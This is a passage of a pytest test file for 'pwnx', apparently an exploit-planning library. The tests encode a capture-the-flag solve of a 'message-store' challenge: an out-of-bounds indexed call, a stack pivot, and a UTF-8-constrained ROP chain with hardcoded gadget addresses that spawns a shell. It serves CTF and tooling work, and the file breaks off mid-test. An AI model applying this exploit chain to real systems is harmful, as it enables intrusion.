from __future__ import annotations

import ast
import importlib
import inspect
import os
from pathlib import Path
import subprocess

import pytest

import pwnx
import pwnx.advanced as advanced
from elf_factory import make_elf
from pwnx import Challenge, Trace, bytes_, choice, field, integer
from pwnx.actions import Emit, Encoded, Sequence
from pwnx.errors import ConstraintError, PlanningError
from pwnx.transport import Tube


TABLE = 0x2F08E8
BUFFER = 0x2F9E38
PIVOT_OFFSET = 80
PIVOT = 0x242D79
POP_RDI = 0x243565
POP_RSI = 0x243431
XOR_EAX = 0x247431
MOV_EDX_EAX = 0x2B184E
POP_RCX = 0x247566
MOV_EAX_ECX = 0x2B4E73
SYSCALL = 0x2A6602
MESSAGE_STORE_EXAMPLE = (
    Path(__file__).parents[1] / "examples" / "message_store_constrained.py"
)
MESSAGE_STORE_SUGAR = (
    Path(__file__).parents[1] / "examples" / "message_store_sugar.py"
)
DICE_CHALLENGE_ENV = os.environ.get("PWNX_DICE_CHALLENGE")
LOCAL_DICE_CHALLENGE = Path(
    "/Users/brandonli/Downloads/pwn-challenges/dice-2026-quals/"
    "pwn_message-store"
)
DICE_CHALLENGE = (
    Path(DICE_CHALLENGE_ENV).expanduser().resolve()
    if DICE_CHALLENGE_ENV
    else LOCAL_DICE_CHALLENGE
)

CANONICAL = MESSAGE_STORE_SUGAR.read_text()


class ScriptedTube(Tube):
    def __init__(self, incoming: bytes):
        super().__init__(timeout=0.1)
        self.incoming = bytearray(incoming)
        self.sent = bytearray()

    def _recv_raw(self, max_bytes, timeout):
        if not self.incoming:
            return b""
        data = bytes(self.incoming[:max_bytes])
        del self.incoming[:max_bytes]
        return data

    def _send_raw(self, data, timeout):
        self.sent.extend(data)
        return len(data)

    def _close_raw(self):
        pass


class FailingTube(Tube):
    def _recv_raw(self, max_bytes, timeout):
        raise AssertionError("replay attempted a live receive")

    def _send_raw(self, data, timeout):
        raise AssertionError("replay attempted a live send")

    def _close_raw(self):
        pass


def store_menu(challenge: Challenge):
    return challenge.protocol.menu(b"> ", name="store").define(
        message=choice(
            b"1",
            field(b"Message?", bytes_(max_size=0x1000), "data"),
        ),
        color=choice(
            b"2",
            field(b"> ", integer(delimiter=None), "index"),
        ),
        show=choice(b"3"),
    )


def configured_control(tmp_path: Path):
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    encoding = pwnx.utf8()
    message = advanced.controlled_buffer(
        challenge,
        "message",
        at=BUFFER,
        size=0x1000,
        writer=store.message,
        constraints=(encoding,),
    )
    dispatch = challenge.control(
        challenge.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(PIVOT_OFFSET),
            trigger=store.show,
            state={"eax": message.address},
        )
    )
    pivot = challenge.control(
        advanced.pivot(
            dispatch, stack=message, pointer_register="eax", gadget=PIVOT
        )
    )
    gadgets = advanced.rop_palette(
        challenge,
        pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
        zero={"rax": XOR_EAX},
        move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
        syscall=SYSCALL,
        constraints=(encoding,),
    )
    challenge.want(
        challenge.execve("sh"),
        via=pivot,
        using=gadgets,
        terminal=False,
    )
    return challenge, message, gadgets


def configured_challenge(tmp_path: Path):
    challenge, _message, _gadgets = configured_control(tmp_path)
    return challenge


def sugar_challenge(tmp_path: Path):
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ",
        name="store",
        message=(1, b"Message?", bytes),
        color=(2, b"> ", int),
        show=3,
    )
    message = challenge.buffer(
        name="message", at=BUFFER, size=0x1000, encoding="utf8"
    ).written_by(store.message)
    dispatch = challenge.control(
        store.color.indexes(
            table=TABLE,
            target=message.qword(PIVOT_OFFSET),
            trigger=store.show,
            eax=message,
        )
    )
    pivot = challenge.control(
        dispatch.pivot(register="eax", stack=message, gadget=PIVOT)
    )
    palette = (
        challenge.rop(pwnx.utf8())
        .pop("rdi", POP_RDI)
        .pop("rsi", POP_RSI)
        .zero("rax", XOR_EAX)
        .move("rdx", "rax", MOV_EDX_EAX)
        .pop("rcx", POP_RCX)
        .move("rax", "rcx", MOV_EAX_ECX)
        .syscall(SYSCALL)
    )
    challenge.want(
        challenge.execve("sh"), via=pivot, using=palette, terminal=False
    )
    return challenge


def extract_payload(plan) -> tuple[bytes, int, bytes]:
    tube = ScriptedTube(b"> Message?> > > ")
    with plan.run(transport=tube):
        pass
    sent = bytes(tube.sent)
    message_end = sent.index(b"\n2\n")
    color_end = sent.index(b"\n", message_end + 3)
    return (
        sent[2:message_end],
        int(sent[message_end + 3 : color_end]),
        sent[color_end + 1 :],
    )


def attach_execve_goal(
    challenge: Challenge,
    store,
    *,
    address: int,
    table: int,
):
    encoding = pwnx.utf8()
    message = advanced.controlled_buffer(
        challenge,
        f"message-{address:x}",
        at=address,
        size=0x1000,
        writer=store.message,
        constraints=(encoding,),
    )
    dispatch = challenge.control(
        challenge.indirect_call(
            table=table,
            index=store.color,
            target=message.qword(PIVOT_OFFSET),
            trigger=store.show,
            state={"eax": message.address},
        )
    )
    pivot = challenge.control(
        advanced.pivot(
            dispatch, stack=message, pointer_register="eax", gadget=PIVOT
        )
    )
    palette = advanced.rop_palette(
        challenge,
        pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
        zero={"rax": XOR_EAX},
        move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
        syscall=SYSCALL,
        constraints=(encoding,),
    )
    challenge.want(
        challenge.execve("sh"), via=pivot, using=palette, terminal=False
    )
    return message, dispatch, pivot, palette


def sequence_names(plan) -> list[str]:
    names: list[str] = []

    def visit(action) -> None:
        if not isinstance(action, Sequence):
            return
        if action.name.startswith("store."):
            names.append(action.name)
        for child in action.actions:
            visit(child)

    for stage in plan.stages:
        for action in stage.actions:
            visit(action)
    return names


def codec_signature(codec) -> tuple:
    fields = tuple(
        (name, getattr(codec, name))
        for name in (
            "length",
            "delimiter",
            "drop_delimiter",
            "max_size",
            "base",
            "prefix",
            "maximum_digits",
            "signed",
        )
        if hasattr(codec, name)
    )
    return type(codec).__name__, fields


def contract_signature(action) -> tuple:
    contract = action.contract()

    def label(value):
        return getattr(value, "key", None) or getattr(value, "name", None) or str(value)

    return (
        tuple(label(item) for item in contract.requires),
        tuple(label(item) for item in contract.provides),
        tuple(sorted(contract.reads)),
        tuple(sorted(contract.writes)),
        tuple(label(item) for item in contract.invalidates),
        contract.scope.value,
    )


def action_signature(action) -> tuple:
    if isinstance(action, Sequence):
        return (
            "Sequence",
            action.name,
            contract_signature(action),
            tuple(action_signature(child) for child in action.actions),
        )
    if isinstance(action, Emit):
        data = action.data
        if isinstance(data, Encoded):
            data_signature = (
                "Encoded",
                codec_signature(data.codec),
                getattr(data.value, "key", data.value),
            )
        else:
            data_signature = ("raw", data)
        return (
            "Emit",
            data_signature,
            (
                action.channel.prompt,
                action.channel.terminator,
                action.channel.max_size,
                action.channel.timeout,
                action.channel.max_receive,
            ),
            contract_signature(action),
        )
    return (type(action).__name__, action.describe(), contract_signature(action))


def lowered_action_tree(plan) -> tuple:
    return tuple(
        (
            stage.name,
            stage.reason,
            tuple(action_signature(action) for action in stage.actions),
        )
        for stage in plan.stages
    )


def test_canonical_solve_contains_no_manual_rop_or_index_arithmetic(
    tmp_path: Path,
) -> None:
    tree = ast.parse(CANONICAL)
    calls = [node for node in ast.walk(tree) if isinstance(node, ast.Call)]
    attributes = {
        node.attr for node in ast.walk(tree) if isinstance(node, ast.Attribute)
    }
    names = {node.id for node in ast.walk(tree) if isinstance(node, ast.Name)}

    assert not {"p64", "u64", "Payload", "ROPCompiler", "word"} & names
    assert not {"build", "to_bytes"} & attributes
    assert not any(
        isinstance(node, (ast.BinOp, ast.JoinedStr))
        and any(
            isinstance(child, ast.Name) and child.id.lower() in {"table", "buffer", "color"}
            for child in ast.walk(node)
        )
        for node in ast.walk(tree)
    )
    assert not any(isinstance(node, (ast.FunctionDef, ast.ClassDef, ast.Lambda)) for node in ast.walk(tree))
    assert len(calls) < 30

    payload, color, trailing = extract_payload(sugar_challenge(tmp_path).plan())
    payload.decode("utf-8")
    assert color == 4788
    assert trailing == b"3\n"


def test_shipped_message_store_example_uses_the_constrained_frontend() -> None:
    source = MESSAGE_STORE_EXAMPLE.read_text()
    tree = ast.parse(source)
    attributes = {
        node.attr for node in ast.walk(tree) if isinstance(node, ast.Attribute)
    }
    names = {node.id for node in ast.walk(tree) if isinstance(node, ast.Name)}

    assert not {"p64", "u64", "Payload", "ROPCompiler", "word"} & names
    assert not {"build", "to_bytes"} & attributes
    assert "indirect_call" in attributes
    assert "pivot" in attributes or "pivot" in names
    assert "palette" in attributes or "rop_palette" in names
    assert "execve" in attributes
    assert not any(
        isinstance(node, (ast.FunctionDef, ast.ClassDef, ast.Lambda))
        for node in ast.walk(tree)
    )


def test_optional_sugar_is_shorter_without_reintroducing_manual_mechanics() -> None:
    explicit = ast.parse(MESSAGE_STORE_EXAMPLE.read_text())
    sugar = ast.parse(MESSAGE_STORE_SUGAR.read_text())
    banned = {"p64", "u64", "word", "Payload", "ROPCompiler"}

    names = {node.id for node in ast.walk(sugar) if isinstance(node, ast.Name)}
    attributes = {
        node.attr for node in ast.walk(sugar) if isinstance(node, ast.Attribute)
    }
    explicit_calls = sum(isinstance(node, ast.Call) for node in ast.walk(explicit))
    sugar_calls = sum(isinstance(node, ast.Call) for node in ast.walk(sugar))

    assert not names & banned
    assert not {"build", "to_bytes"} & attributes
    assert sugar_calls < explicit_calls
    assert not any(
        isinstance(node, (ast.FunctionDef, ast.ClassDef, ast.Lambda))
        for node in ast.walk(sugar)
    )


def test_sugar_lowers_to_identical_plan_payload_and_index(tmp_path: Path) -> None:
    explicit_path = tmp_path / "explicit"
    sugar_path = tmp_path / "sugar"
    explicit_path.mkdir()
    sugar_path.mkdir()
    explicit = configured_challenge(explicit_path)
    sugar = sugar_challenge(sugar_path)

    explicit_plan = explicit.plan()
    sugar_plan = sugar.plan()
    explicit_payload = extract_payload(explicit_plan)
    sugar_payload = extract_payload(sugar_plan)

    assert sugar_plan.to_dict() == explicit_plan.to_dict()
    assert sugar_payload == explicit_payload


def test_sugar_and_explicit_forms_have_identical_lowered_actions_and_contracts(
    tmp_path: Path,
) -> None:
    explicit_path = tmp_path / "explicit"
    sugar_path = tmp_path / "sugar"
    explicit_path.mkdir()
    sugar_path.mkdir()

    explicit = configured_challenge(explicit_path).plan()
    sugar = sugar_challenge(sugar_path).plan()

    assert lowered_action_tree(sugar) == lowered_action_tree(explicit)


def test_menu_sugar_infers_fields_and_operations_are_callable(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ",
        name="store",
        message=(1, b"Message?", bytes),
        color=(2, b"> ", int),
        show=3,
    )

    message = store.message(b"hello")
    color = store.color(7)
    show = store.show()

    assert isinstance(message, Sequence)
    assert isinstance(color, Sequence)
    assert isinstance(show, Sequence)
    assert message.name.startswith("store.message#")
    assert color.name.startswith("store.color#")
    assert show.name.startswith("store.show#")


def test_buffer_sugar_writer_and_qword_match_explicit_surface(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(b"> ", message=(1, b"Message?", bytes))
    message = challenge.buffer(
        at=BUFFER, size=0x1000, encoding="utf8"
    ).written_by(store.message)

    assert message.name == "buffer"
    assert message.address == BUFFER
    assert message.constraints == (pwnx.utf8(),)
    assert message.qword(80).offset == 80
    assert message.qword(80).size == 8


def test_buffer_sugar_binds_only_selected_writer_codec_and_shares_ids(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ",
        message=(1, b"Message?", bytes),
        other=(2, b"Other?", bytes),
    )
    message = challenge.buffer(
        at=BUFFER,
        size=0x1000,
        encoding="utf8",
    ).written_by(store.message)

    assert message.writer.definition.fields[0].codec.max_size == 0x1000
    assert store.menu.choices["message"].fields[0].codec.max_size == 0x100000
    assert store.menu.choices["other"].fields[0].codec.max_size == 0x100000
    assert store.other(b"A").name == "store.other#1"
    assert message.writer(b"B").name == "store.message#2"


def test_buffer_sugar_narrows_inferred_bytes_codec_to_buffer_size(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(b"> ", message=(1, b"Message?", bytes))

    message = challenge.buffer(at=BUFFER, size=0x1000).written_by(store.message)

    assert store.menu.choices["message"].fields[0].codec.max_size == 0x100000
    assert message.writer.definition.fields[0].codec.max_size == 0x1000


def test_buffer_sugar_does_not_widen_explicit_smaller_bytes_codec(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ", message=(1, b"Message?", bytes_(max_size=16))
    )

    message = challenge.buffer(at=BUFFER, size=0x1000).written_by(store.message)

    assert store.menu.choices["message"].fields[0].codec.max_size == 16
    assert message.writer.definition.fields[0].codec.max_size == 16


def test_sugar_and_explicit_writers_reject_oversize_at_same_codec_boundary(
    tmp_path: Path,
) -> None:
    explicit_challenge = Challenge(make_elf(tmp_path / "explicit", pie=False))
    explicit = explicit_challenge.protocol.menu(b"> ", name="store").define(
        message=choice(
            b"1", field(b"Message?", bytes_(max_size=8), "data")
        )
    )
    sugar_challenge = Challenge(make_elf(tmp_path / "sugar", pie=False))
    sugar = sugar_challenge.menu(b"> ", message=(1, b"Message?", bytes))
    sugar_buffer = sugar_challenge.buffer(at=BUFFER, size=8).written_by(sugar.message)

    explicit_data = explicit.message(b"A" * 9).actions[-1].data
    sugar_data = sugar_buffer.writer(b"A" * 9).actions[-1].data
    assert isinstance(explicit_data, Encoded)
    assert isinstance(sugar_data, Encoded)

    with pytest.raises(ConstraintError, match="9 bytes|maximum is 8"):
        explicit_data.build()
    with pytest.raises(ConstraintError, match="9 bytes|maximum is 8"):
        sugar_data.build()


@pytest.mark.parametrize(
    "order",
    [
        ("small", "large"),
        ("large", "small"),
    ],
)
def test_quick_operation_buffer_bindings_are_independent_and_order_invariant(
    tmp_path: Path,
    order: tuple[str, str],
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ", name="store", message=(1, b"Message?", bytes)
    )
    base_operation = store.message
    base_choice = store.menu.choices["message"]
    specifications = {
        "small": (BUFFER, 0x10),
        "large": (BUFFER + 0x2000, 0x1000),
    }
    bound = {}

    for name in order:
        address, size = specifications[name]
        bound[name] = challenge.buffer(
            name=name, at=address, size=size
        ).written_by(base_operation)

    base_codec = base_choice.fields[0].codec
    small_writer = bound["small"].writer
    large_writer = bound["large"].writer

    assert base_codec.max_size == 0x100000
    assert base_operation.definition is None
    assert store.menu.choices["message"] is base_choice
    assert small_writer is not base_operation
    assert large_writer is not base_operation
    assert small_writer is not large_writer
    assert small_writer.definition is not large_writer.definition
    assert small_writer.definition.fields[0].codec.max_size == 0x10
    assert large_writer.definition.fields[0].codec.max_size == 0x1000


def test_multi_buffer_bindings_lower_like_explicit_codecs_and_share_menu_ids(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ", name="store", message=(1, b"Message?", bytes)
    )
    small = challenge.buffer(
        name="small", at=BUFFER, size=0x10
    ).written_by(store.message)
    large = challenge.buffer(
        name="large", at=BUFFER + 0x2000, size=0x1000
    ).written_by(store.message)
    explicit_small = challenge.protocol.menu(b"> ", name="explicit-small").define(
        message=choice(
            b"1", field(b"Message?", bytes_(max_size=0x10), "data")
        )
    )
    explicit_large = challenge.protocol.menu(b"> ", name="explicit-large").define(
        message=choice(
            b"1", field(b"Message?", bytes_(max_size=0x1000), "data")
        )
    )

    small_action = small.writer(b"A")
    large_action = large.writer(b"B")
    explicit_small_action = explicit_small.message(b"A")
    explicit_large_action = explicit_large.message(b"B")

    assert codec_signature(small_action.actions[-1].data.codec) == codec_signature(
        explicit_small_action.actions[-1].data.codec
    )
    assert codec_signature(large_action.actions[-1].data.codec) == codec_signature(
        explicit_large_action.actions[-1].data.codec
    )
    assert small_action.name == "store.message#1"
    assert large_action.name == "store.message#2"


def test_multi_buffer_bound_writers_replay_without_identity_drift(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ", name="store", message=(1, b"Message?", bytes)
    )
    small = challenge.buffer(
        name="small", at=BUFFER, size=0x10
    ).written_by(store.message)
    large = challenge.buffer(
        name="large", at=BUFFER + 0x2000, size=0x1000
    ).written_by(store.message)
    challenge.sequence(small.writer(b"A"), name="small buffer write")
    challenge.want(large.writer(b"B"), terminal=False)
    plan = challenge.plan()
    trace = Trace()
    live = ScriptedTube(b"> Message?> Message?")

    with plan.run(transport=live, trace=trace):
        pass
    with plan.run(transport=FailingTube(), replay=trace):
        pass

    assert bytes(live.sent) == b"1\nA\n1\nB\n"


def test_index_operation_sugar_is_owned_by_its_challenge(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ",
        message=(1, b"Message?", bytes),
        color=(2, b"> ", int),
        show=3,
    )
    message = challenge.buffer(
        at=BUFFER, size=0x1000, encoding="utf8"
    ).written_by(store.message)

    dispatch = store.color.indexes(
        table=TABLE,
        target=message.qword(80),
        trigger=store.show,
        eax=message,
    )

    assert dispatch.challenge is challenge
    assert dispatch.index == 4788


def test_canonical_pivot_normalizes_register_alias(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = challenge.menu(
        b"> ",
        name="store",
        message=(1, b"Message?", bytes),
        color=(2, b"> ", int),
        show=3,
    )
    message = challenge.buffer(
        at=BUFFER, size=0x1000, encoding="utf8"
    ).written_by(store.message)
    dispatch = store.color.indexes(
        table=TABLE,
        target=message.qword(80),
        trigger=store.show,
        eax=message,
    )

    pivot = dispatch.pivot(register="eax", stack=message, gadget=PIVOT)

    assert pivot.pointer_register == "rax"
    assert pivot.stack is message


def test_fluent_rop_builder_is_public_and_autocomplete_discoverable(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    builder = challenge.rop(pwnx.utf8())

    assert type(builder).__name__ == "RopBuilder"
    for method in ("pop", "zero", "move", "syscall"):
        assert callable(getattr(builder, method))


def test_fluent_rop_builder_is_immutable(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    empty = challenge.rop(pwnx.utf8())
    with_rdi = empty.pop("rdi", POP_RDI)
    with_rsi = with_rdi.pop("rsi", POP_RSI)

    empty_palette = empty.syscall(SYSCALL)
    rdi_palette = with_rdi.syscall(SYSCALL)
    rsi_palette = with_rsi.syscall(SYSCALL)

    assert empty is not with_rdi
    assert with_rdi is not with_rsi
    assert dict(empty_palette.pop) == {}
    assert dict(rdi_palette.pop) == {"rdi": POP_RDI}
    assert dict(rsi_palette.pop) == {"rdi": POP_RDI, "rsi": POP_RSI}


@pytest.mark.parametrize(
    ("first", "second", "message"),
    [
        (POP_RDI, POP_RDI, "duplicate"),
        (POP_RDI, POP_RSI, "conflict"),
    ],
)
def test_fluent_rop_builder_rejects_duplicate_or_conflicting_assignments(
    tmp_path: Path,
    first: int,
    second: int,
    message: str,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    builder = challenge.rop(pwnx.utf8()).pop("rdi", first)

    with pytest.raises(PlanningError, match=message):
        builder.pop("rdi", second)


@pytest.mark.parametrize(
    "operation",
    [
        lambda builder: builder.pop("mystery", POP_RDI),
        lambda builder: builder.zero("wat", XOR_EAX),
        lambda builder: builder.move("rax", "unknown", MOV_EAX_ECX),
    ],
)
def test_fluent_rop_builder_rejects_unknown_registers(
    tmp_path: Path,
    operation,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(PlanningError, match="unknown|register"):
        operation(challenge.rop(pwnx.utf8()))


def test_fluent_rop_builder_normalizes_register_aliases(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    palette = (
        challenge.rop(pwnx.utf8())
        .pop("r8d", POP_RDI)
        .zero("eax", XOR_EAX)
        .move("edx", "eax", MOV_EDX_EAX)
        .syscall(SYSCALL)
    )

    assert palette.pop["r8"] == POP_RDI
    assert palette.zero["rax"] == XOR_EAX
    assert palette.move[("rdx", "rax")] == MOV_EDX_EAX


def test_readme_uses_one_canonical_fluent_rop_path() -> None:
    readme = (Path(__file__).parents[1] / "README.md").read_text()

    assert "x.rop(utf8())" in readme
    assert '.pop("rdi"' in readme
    assert '.move("rdx", "rax"' in readme
    assert ".syscall(" in readme
    assert "pop_rdi=" not in readme


@pytest.mark.parametrize(
    "operations",
    [
        {"broken": ()},
        {"broken": (1, b"prompt only")},
        {"broken": (1, b"value: ", float)},
        {"broken": object()},
    ],
)
def test_menu_sugar_rejects_malformed_operation_specs(
    tmp_path: Path,
    operations: dict,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises((TypeError, ValueError), match="operation|menu|field|type|spec"):
        challenge.menu(b"> ", **operations)


@pytest.mark.parametrize(
    "keyword",
    [
        "pop",
        "pop_unknown",
        "move_rax",
        "move_rax_rcx_extra",
        "zero",
        "syscall_extra",
        "constraint",
    ],
)
def test_callable_rop_sugar_rejects_malformed_gadget_keywords(
    tmp_path: Path,
    keyword: str,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(
        (TypeError, PlanningError),
        match="gadget|keyword|rop|semantic|register|constraint",
    ):
        challenge.rop(**{keyword: POP_RDI})


def test_constrained_control_plan_is_semantic_and_compact(tmp_path: Path) -> None:
    plan = configured_challenge(tmp_path).plan()
    rendered = plan.show().lower()
    for phrase in (
        "controlled buffer",
        "utf-8",
        "indexed indirect call",
        "stack pivot",
        "execve",
        "constrained rop",
    ):
        assert phrase in rendered
    assert "payload(" not in rendered
    assert "object at 0x" not in rendered
    assert len(rendered) < 8_000


def test_constrained_control_planning_is_idempotent(tmp_path: Path) -> None:
    challenge = configured_challenge(tmp_path)
    assert challenge.plan().to_dict() == challenge.plan().to_dict()


def test_pwnx_builds_utf8_payload_and_computes_oob_index(tmp_path: Path) -> None:
    plan = configured_challenge(tmp_path).plan()
    payload, color, trailing = extract_payload(plan)

    payload.decode("utf-8")
    assert int.from_bytes(payload[PIVOT_OFFSET : PIVOT_OFFSET + 8], "little") == PIVOT
    assert color == (BUFFER + PIVOT_OFFSET - TABLE) // 8
    assert trailing == b"3\n"

    path_pointer = int.from_bytes(payload[8:16], "little")
    path_offset = path_pointer - BUFFER
    assert 0 <= path_offset <= len(payload) - 3
    assert payload[path_offset : path_offset + 3] == b"sh\x00"


def test_constrained_control_trace_replays_without_live_effects(tmp_path: Path) -> None:
    plan = configured_challenge(tmp_path).plan()
    trace = Trace()
    live = ScriptedTube(b"> Message?> > > ")

    with plan.run(transport=live, trace=trace):
        pass
    with plan.run(transport=FailingTube(), replay=trace):
        pass


def test_sugar_trace_replays_with_the_same_menu_identity(tmp_path: Path) -> None:
    plan = sugar_challenge(tmp_path).plan()
    trace = Trace()
    live = ScriptedTube(b"> Message?> > > ")

    with plan.run(transport=live, trace=trace):
        pass
    with plan.run(transport=FailingTube(), replay=trace):
        pass

    assert sequence_names(plan) == [
        "store.message#1",
        "store.color#2",
        "store.show#3",
    ]


def test_buffer_rejects_qword_slot_outside_declared_storage(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    message = advanced.controlled_buffer(
        challenge,
        "message",
        at=BUFFER,
        size=32,
        writer=store_menu(challenge).message,
        constraints=(pwnx.utf8(),),
    )
    with pytest.raises(PlanningError, match="buffer|outside|qword"):
        message.qword(32)


def test_indexed_call_rejects_unaligned_table_target(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = advanced.controlled_buffer(
        challenge,
        "message",
        at=BUFFER,
        size=0x100,
        writer=store.message,
        constraints=(pwnx.utf8(),),
    )
    with pytest.raises(PlanningError, match="index|aligned|entry"):
        challenge.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(1),
            trigger=store.show,
            state={"eax": message.address},
        )


def test_pivot_requires_register_to_point_at_declared_buffer(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = advanced.controlled_buffer(
        challenge,
        "message",
        at=BUFFER,
        size=0x100,
        writer=store.message,
        constraints=(pwnx.utf8(),),
    )
    dispatch = challenge.indirect_call(
        table=TABLE,
        index=store.color,
        target=message.qword(80),
        trigger=store.show,
        state={"eax": message.address + 8},
    )
    with pytest.raises(PlanningError, match="eax|buffer|points"):
        advanced.pivot(
            dispatch, stack=message, pointer_register="eax", gadget=PIVOT
        )


def test_palette_rejects_gadget_address_that_violates_utf8(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(ConstraintError, match="utf-8|encoding|gadget"):
        advanced.rop_palette(
            challenge,
            pop={"rdi": 0x242D80},
            syscall=SYSCALL,
            constraints=(pwnx.utf8(),),
        )


def test_execve_reports_missing_register_realization(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = advanced.controlled_buffer(
        challenge,
        "message",
        at=BUFFER,
        size=0x1000,
        writer=store.message,
        constraints=(pwnx.utf8(),),
    )
    dispatch = challenge.control(
        challenge.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(80),
            trigger=store.show,
            state={"eax": message.address},
        )
    )
    pivot = challenge.control(
        advanced.pivot(
            dispatch, stack=message, pointer_register="eax", gadget=PIVOT
        )
    )
    incomplete = advanced.rop_palette(
        challenge,
        pop={"rdi": POP_RDI, "rsi": POP_RSI},
        syscall=SYSCALL,
        constraints=(pwnx.utf8(),),
    )
    challenge.want(
        challenge.execve("sh"),
        via=pivot,
        using=incomplete,
        terminal=False,
    )
    with pytest.raises(PlanningError, match="rax|rdx|register|realize"):
        challenge.plan()


def test_controlled_buffer_layout_emits_explicit_stored_data(tmp_path: Path) -> None:
    challenge, message, _gadgets = configured_control(tmp_path)
    message.store(b"VISIBLE", offset=0xA0)

    payload, _color, _trailing = extract_payload(challenge.plan())

    assert payload[0xA0 : 0xA7] == b"VISIBLE"


@pytest.mark.parametrize("dispatch_offset", [0, 8, 0x40])
def test_dispatch_slot_rejects_rop_qword_overlap(
    tmp_path: Path,
    dispatch_offset: int,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = advanced.controlled_buffer(
        challenge,
        "message", at=BUFFER, size=0x1000, writer=store.message,
        constraints=(pwnx.utf8(),),
    )
    dispatch = challenge.control(
        challenge.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(dispatch_offset),
            trigger=store.show,
            state={"eax": message.address},
        )
    )
    pivot = challenge.control(
        advanced.pivot(
            dispatch, stack=message, pointer_register="eax", gadget=PIVOT
        )
    )
    palette = advanced.rop_palette(
        challenge,
        pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
        zero={"rax": XOR_EAX},
        move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
        syscall=SYSCALL,
        constraints=(pwnx.utf8(),),
    )
    challenge.want(
        challenge.execve("sh"), via=pivot, using=palette, terminal=False
    )

    with pytest.raises(PlanningError, match="overlap|dispatch|rop|layout"):
        challenge.plan()


def test_dispatch_qword_rejects_partial_stored_data_overlap(tmp_path: Path) -> None:
    challenge, message, _gadgets = configured_control(tmp_path)
    with pytest.raises(PlanningError, match="overlap|dispatch|stored|layout"):
        message.store(b"PART", offset=PIVOT_OFFSET + 4)


def test_stored_data_rejects_rop_chain_overlap(tmp_path: Path) -> None:
    challenge, message, _gadgets = configured_control(tmp_path)
    with pytest.raises(PlanningError, match="overlap|stored|rop|layout"):
        message.store(b"CHAIN", offset=0x20)


def test_path_placement_avoids_stored_dispatch_and_rop_ranges(tmp_path: Path) -> None:
    challenge, message, _gadgets = configured_control(tmp_path)
    marker = message.store(b"MARKER", offset=0x58)

    payload, _color, _trailing = extract_payload(challenge.plan())
    path_pointer = int.from_bytes(payload[8:16], "little")
    path_offset = path_pointer - BUFFER

    assert payload[marker.offset : marker.offset + marker.size] == b"MARKER"
    assert not (marker.offset <= path_offset < marker.offset + marker.size)
    assert not (PIVOT_OFFSET <= path_offset < PIVOT_OFFSET + 8)
    assert path_offset >= 0x58


def test_rop_palette_rejects_foreign_challenge(tmp_path: Path) -> None:
    first_path = tmp_path / "first"
    second_path = tmp_path / "second"
    first_path.mkdir()
    second_path.mkdir()
    first = configured_challenge(first_path)
    second = configured_challenge(second_path)
    foreign = advanced.rop_palette(
        second,
        pop={"rdi": POP_RDI, "rsi": POP_RSI, "rcx": POP_RCX},
        zero={"rax": XOR_EAX},
        move={("rdx", "rax"): MOV_EDX_EAX, ("rax", "rcx"): MOV_EAX_ECX},
        syscall=SYSCALL,
        constraints=(pwnx.utf8(),),
    )
    goal = first._goals[0]

    with pytest.raises(PlanningError, match="palette|challenge|artifact|foreign"):
        first.want(goal.effect, via=goal.via, using=foreign, terminal=False)


def test_rop_palette_carries_target_artifact_identity(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    palette = advanced.rop_palette(
        challenge,
        pop={"rdi": POP_RDI},
